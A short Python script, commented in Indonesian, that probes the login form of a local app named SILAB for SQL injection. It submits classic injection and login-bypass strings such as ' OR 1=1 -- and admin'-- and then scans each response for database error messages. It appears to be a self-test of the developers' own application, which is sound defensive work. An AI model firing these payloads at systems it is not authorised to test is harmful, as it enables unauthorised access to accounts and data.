
import requests
from urllib.parse import urljoin

# URL aplikasi SILAB lokal
BASE_URL = "http://localhost/silab/"

# Daftar input pengujian non-destruktif
PAYLOADS = [
    "'",
    '"',
    "' OR '1'='1",
    "' OR 1=1 -- ",
    "admin'-- ",
    "' AND '1'='2"
]

# Ganti dengan endpoint login SILAB yang sebenarnya
LOGIN_URL = urljoin(BASE_URL, "HTML/auth/login.php")

session = requests.Session()

print("=" * 55)
print("PENGUJIAN SQL INJECTION SILAB")
print("=" * 55)

for payload in PAYLOADS:
    try:
        response = session.post(
            LOGIN_URL,
            data={
                "nip_npm": payload,
                "password": "password_pengujian"
            },
            timeout=10,
            allow_redirects=False
        )

        body = response.text.lower()

        indikator_error = [
            "sql syntax",
            "sqlstate",
            "mysql error",
            "pdoexception",
            "warning: mysqli"
        ]

        ditemukan = [
            indikator for indikator in indikator_error
            if indikator in body
        ]

        if ditemukan:
            status = "POTENSI RENTAN"
            alasan = ", ".join(ditemukan)
        elif response.status_code >= 500:
            status = "PERLU DIPERIKSA"
            alasan = f"HTTP {response.status_code}"
        else:
            status = "TIDAK ADA ERROR SQL TERDETEKSI"
            alasan = f"HTTP {response.status_code}"

        print(f"\nInput  : {payload}")
        print(f"Hasil  : {status}")
        print(f"Detail : {alasan}")

    except requests.RequestException as error:
        print(f"\nGagal menghubungi SILAB: {error}")

print("\nPengujian selesai.")
